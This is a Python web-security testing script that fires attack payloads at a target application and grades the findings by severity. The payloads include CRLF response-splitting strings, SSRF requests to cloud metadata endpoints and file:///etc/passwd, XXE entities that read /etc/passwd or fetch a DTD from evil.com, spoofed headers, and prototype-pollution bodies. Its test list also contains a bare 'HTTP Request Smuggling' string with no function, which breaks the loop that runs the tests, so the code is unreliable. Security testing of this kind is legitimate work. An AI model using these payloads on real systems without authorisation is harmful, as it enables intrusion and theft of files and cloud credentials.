#!/usr/bin/env python3
"""
Advanced Attack Vector Testing Script
Tests additional security concerns beyond the basic network audit

Author: Security Team
Version: 1.0.0
"""

import json
import sys
from typing import Any, Dict, List
from urllib.parse import quote, urlparse

import requests


class AdvancedSecurityTester:
    """Test advanced attack vectors"""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip("/")
        self.results = {
            "timestamp": None,
            "target": base_url,
            "tests": {},
            "findings": [],
            "summary": {},
        }

    def run_all_tests(self) -> Dict[str, Any]:
        """Run all advanced security tests"""
        from datetime import datetime

        self.results["timestamp"] = datetime.utcnow().isoformat()

        print("=" * 70)
        print("ADVANCED ATTACK VECTOR TESTING")
        print("=" * 70)
        print(f"Target: {self.base_url}")
        print()

        # Test categories
        tests = [
            ("HTTP Parameter Pollution", self.test_http_parameter_pollution),
            ("Header Injection", self.test_header_injection),
            "HTTP Request Smuggling",
            ("CRLF Injection", self.test_crlf_injection),
            ("Server-Side Request Forgery", self.test_ssrf),
            ("XML External Entity", self.test_xxe),
            ("Prototype Pollution", self.test_prototype_pollution),
            ("GraphQL Injection", self.test_graphql_injection),
            ("Websocket Security", self.test_websocket_security),
            ("Memory Dump Analysis", self.test_memory_dump_analysis),
        ]

        for test_name, test_func in tests:
            print(f"\n🔍 Testing: {test_name}")
            print("-" * 70)
            try:
                test_func()
            except Exception as e:
                print(f"  ⚠️  Test error: {e}")
            print()

        # Generate summary
        self._generate_summary()
        self._print_report()

        return self.results

    def test_http_parameter_pollution(self) -> None:
        """Test HTTP Parameter Pollution vulnerabilities"""

        tests = [
            # Test duplicate parameters
            (
                "/api/v1/auth/login",
                {
                    "email": ["user@example.com", "admin@example.com"],
                    "password": "test",
                },
            ),
            ("/api/v1/users/1", {"id": ["1", "2"], "token": "test"}),
            # Test parameter arrays
            ("/api/v1/search", {"q": ["test", "admin"], "filter": ["all", "users"]}),
        ]

        for endpoint, params in tests:
            print(f"  Testing endpoint: {endpoint}")

            try:
                response = requests.get(
                    f"{self.base_url}{endpoint}", params=params, timeout=5
                )

                # Check if application accepted duplicate parameters
                if response.status_code == 200:
                    print(f"    ⚠️  Accepted duplicate parameters (200)")
                    self.results["findings"].append(
                        {
                            "severity": "MEDIUM",
                            "issue": "HTTP Parameter Pollution possible",
                            "endpoint": endpoint,
                            "details": "Application accepted duplicate parameters without validation",
                        }
                    )
                else:
                    print(f"    ✓ Rejected ({response.status_code})")

            except requests.exceptions.RequestException:
                print(f"    ⊘ Not accessible")

    def test_header_injection(self) -> None:
        """Test HTTP header injection vulnerabilities"""

        malicious_headers = [
            ("X-Forwarded-For", "1.1.1.1, 2.2.2.2"),
            ("X-Forwarded-Host", "evil.com"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            (
                "User-Agent",
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            ),
            ("Referer", "javascript:alert(1)"),
            ("Origin", "javascript:alert(1)"),
        ]

        for header_name, header_value in malicious_headers:
            print(f"  Testing header: {header_name}")

            try:
                response = requests.get(
                    f"{self.base_url}/health",
                    headers={header_name: header_value},
                    timeout=5,
                )

                # Check if header affected response
                if "evil.com" in response.text or "admin" in response.text.lower():
                    print(f"    ⚠️  Header injection possible")
                    self.results["findings"].append(
                        {
                            "severity": "HIGH",
                            "issue": f"Header injection via {header_name}",
                            "details": f"Value '{header_value}' affected response",
                        }
                    )
                else:
                    print(f"    ✓ No impact")

            except requests.exceptions.RequestException:
                print(f"    ⊘ Error testing")

    def test_crlf_injection(self) -> None:
        """Test CRLF (Carriage Return Line Feed) injection"""

        crlf_payloads = [
            "test%0d%0aSet-Cookie:%20malicious=value",
            "test%0d%0aLocation:%20http://evil.com",
            "test%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<p>pwned</p>",
        ]

        for payload in crlf_payloads:
            print(f"  Testing CRLF payload")

            try:
                response = requests.get(
                    f"{self.base_url}/health", params={"q": payload}, timeout=5
                )

                # Check for CRLF injection signs
                headers_str = str(response.headers)
                if "evil.com" in headers_str or "malicious" in headers_str:
                    print(f"    ⚠️  CRLF injection detected")
                    self.results["findings"].append(
                        {
                            "severity": "CRITICAL",
                            "issue": "CRLF injection vulnerability",
                            "details": "Carriage return and line feed characters injected into headers",
                        }
                    )
                else:
                    print(f"    ✓ No CRLF injection")

            except requests.exceptions.RequestException:
                print(f"    ⊘ Error testing")

    def test_ssrf(self) -> None:
        """Test Server-Side Request Forgery"""

        ssrf_payloads = [
            "http://localhost:8000/admin",
            "http://127.0.0.1:8000/internal",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://169.254.170.2/",  # ECS metadata
            "file:///etc/passwd",
            "ftp://evil.com",
            "dns://evil.com",
        ]

        for payload in ssrf_payloads:
            print(f"  Testing SSRF payload: {payload[:50]}...")

            try:
                response = requests.get(
                    f"{self.base_url}/api/v1/fetch", params={"url": payload}, timeout=5
                )

                if response.status_code == 200:
                    # Check if we got internal data
                    if (
                        "meta-data" in response.text
                        or "internal" in response.text.lower()
                    ):
                        print(f"    ⚠️  SSRF vulnerability detected")
                        self.results["findings"].append(
                            {
                                "severity": "CRITICAL",
                                "issue": "Server-Side Request Forgery",
                                "details": f"Can access internal resource: {payload}",
                            }
                        )
                    else:
                        print(f"    ✓ Blocked")
                else:
                    print(f"    ✓ Blocked ({response.status_code})")

            except requests.exceptions.RequestException:
                print(f"    ✓ Blocked (error)")

    def test_xxe(self) -> None:
        """Test XML External Entity injection"""

        xxe_payloads = [
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>""",
        ]

        for payload in xxe_payloads:
            print(f"  Testing XXE payload")

            try:
                response = requests.post(
                    f"{self.base_url}/api/v1/upload",
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=5,
                )

                if "root:" in response.text or "meta-data" in response.text:
                    print(f"    ⚠️  XXE vulnerability detected")
                    self.results["findings"].append(
                        {
                            "severity": "CRITICAL",
                            "issue": "XML External Entity injection",
                            "details": "Can read internal files via XXE",
                        }
                    )
                else:
                    print(f"    ✓ XXE blocked")

            except requests.exceptions.RequestException:
                print(f"    ✓ XXE blocked (error)")

    def test_prototype_pollution(self) -> None:
        """Test JavaScript prototype pollution"""

        pollution_payloads = [
            {"__proto__.isAdmin": "true"},
            {"__proto__.user": "admin"},
            {"constructor.prototype.isAdmin": "true"},
            {"json.__proto__.isAdmin": "true"},
        ]

        for payload in pollution_payloads:
            print(f"  Testing prototype pollution")

            try:
                response = requests.post(
                    f"{self.base_url}/api/v1/users", json=payload, timeout=5
                )

                response_json = response.json()

                # Check if prototype was polluted
                if (
                    response_json.get("isAdmin") == True
                    or response_json.get("user") == "admin"
                ):
                    print(f"    ⚠️  Prototype pollution possible")
                    self.results["findings"].append(
                        {
                            "severity": "HIGH",
                            "issue": "JavaScript prototype pollution",
                            "details": f"Payload {payload} affected object prototype",
                        }
                    )
                else:
                    print(f"    ✓ Protected")

            except (requests.exceptions.RequestException, json.JSONDecodeError):
                print(f"    ✓ Protected (error)")

    def test_graphql_injection(self) -> None:
        """Test GraphQL injection (if GraphQL endpoint exists)"""

        graphql_queries = [
            # Introspection query
            """
            query {
                __schema {
                    types {
                        name
                    }
                }
            }
            """,
            # Nested query DoS
            """
            query {
                user(id: "1") {
                    friends {
                        friends {
                            friends {
                                friends {
                                    friends {
                                        id
                                    }
                                }
                            }
                        }
                    }
                }
            }
            """,
        ]

        for query in graphql_queries:
            print(f"  Testing GraphQL query")

            try:
                response = requests.post(
                    f"{self.base_url}/graphql", json={"query": query}, timeout=5
                )

                if response.status_code == 200:
                    data = response.json()
                    if "data" in data:
                        print(f"    ⚠️  GraphQL endpoint accessible")
                        self.results["findings"].append(
                            {
                                "severity": "MEDIUM",
                                "issue": "GraphQL endpoint exposed",
                                "details": "Consider disabling introspection in production",
                            }
                        )
                else:
                    print(f"    ✓ GraphQL not available/blocked")

            except requests.exceptions.RequestException:
                print(f"    ✓ GraphQL not available")

    def test_websocket_security(self) -> None:
        """Test WebSocket security"""

        ws_urls = [
            f"ws://{urlparse(self.base_url).netloc}/ws",
            f"wss://{urlparse(self.base_url).netloc}/ws",
            f"ws://{urlparse(self.base_url).netloc}/socket.io/",
        ]

        for ws_url in ws_urls:
            print(f"  Testing WebSocket: {ws_url}")

            try:
                import websocket

                ws = websocket.create_connection(ws_url, timeout=5)
                ws.close()
                print(f"    ⚠️  WebSocket accessible without authentication")
                self.results["findings"].append(
                    {
                        "severity": "MEDIUM",
                        "issue": "Unauthenticated WebSocket",
                        "details": f"WebSocket endpoint accessible: {ws_url}",
                    }
                )
            except ImportError:
                print(f"    ⊘ WebSocket library not available")
            except Exception:
                print(f"    ✓ WebSocket not accessible/blocked")

    def test_memory_dump_analysis(self) -> None:
        """Test for memory leak exposures in error messages"""

        fuzz_payloads = [
            "A" * 10000,
            "A" * 100000,
            "A" * 1000000,
            "%n" * 1000,
            "../" * 100,
        ]

        for payload in fuzz_payloads:
            print(f"  Testing memory dump payload: {len(payload)} chars")

            try:
                response = requests.get(
                    f"{self.base_url}/api/v1/users/{payload}", timeout=5
                )

                # Check for memory addresses or stack traces
                response_text = response.text
                if (
                    "0x" in response_text and len(response_text) > 1000
                ) or "Segmentation fault" in response_text:
                    print(f"    ⚠️  Memory leak detected")
                    self.results["findings"].append(
                        {
                            "severity": "HIGH",
                            "issue": "Memory leak in error messages",
                            "details": "Error messages contain memory addresses or stack traces",
                        }
                    )
                else:
                    print(f"    ✓ No memory leak")

            except requests.exceptions.RequestException:
                print(f"    ✓ Protected")

    def _generate_summary(self) -> None:
        """Generate test summary"""
        findings_by_severity = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}

        for finding in self.results["findings"]:
            severity = finding.get("severity", "LOW")
            findings_by_severity[severity] += 1

        self.results["summary"] = {
            "total_findings": len(self.results["findings"]),
            "by_severity": findings_by_severity,
            "overall_status": self._calculate_status(findings_by_severity),
        }

    def _calculate_status(self, severity_counts: Dict[str, int]) -> str:
        """Calculate overall security status"""
        if severity_counts["CRITICAL"] > 0:
            return "CRITICAL"
        elif severity_counts["HIGH"] > 0:
            return "HIGH_RISK"
        elif severity_counts["MEDIUM"] > 3:
            return "MEDIUM_RISK"
        elif severity_counts["MEDIUM"] > 0:
            return "MODERATE"
        else:
            return "GOOD"

    def _print_report(self) -> None:
        """Print final report"""
        print("=" * 70)
        print("ADVANCED SECURITY TEST REPORT")
        print("=" * 70)
        print()

        # Summary
        summary = self.results["summary"]
        print(f"Overall Status: {summary['overall_status']}")
        print(f"Total Findings: {summary['total_findings']}")
        print()
        print("Findings by Severity:")
        for severity, count in summary["by_severity"].items():
            if count > 0:
                icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}[
                    severity
                ]
                print(f"  {icon} {severity}: {count}")
        print()

        # Detailed findings
        if self.results["findings"]:
            print("DETAILED FINDINGS:")
            print()

            severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
            sorted_findings = sorted(
                self.results["findings"],
                key=lambda f: severity_order.get(f.get("severity", "LOW"), 3),
            )

            for finding in sorted_findings:
                severity = finding.get("severity", "LOW")
                icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}[
                    severity
                ]

                print(f"{icon} [{severity}] {finding.get('issue', 'Unknown')}")
                for key, value in finding.items():
                    if key not in ["severity", "issue"]:
                        print(f"   {key}: {value}")
                print()
        else:
            print("✅ No vulnerabilities detected!")
            print()

        print("=" * 70)


def main():
    """Main execution function"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Advanced attack vector security testing"
    )
    parser.add_argument(
        "--url",
        default="http://localhost:8000",
        help="Base URL of the application to test",
    )

    args = parser.parse_args()

    # Run tests
    tester = AdvancedSecurityTester(args.url)
    results = tester.run_all_tests()

    # Return exit code based on findings
    status = results["summary"]["overall_status"]
    if status in ["CRITICAL", "HIGH_RISK"]:
        return 2
    elif status in ["MEDIUM_RISK", "MODERATE"]:
        return 1
    else:
        return 0


if __name__ == "__main__":
    sys.exit(main())
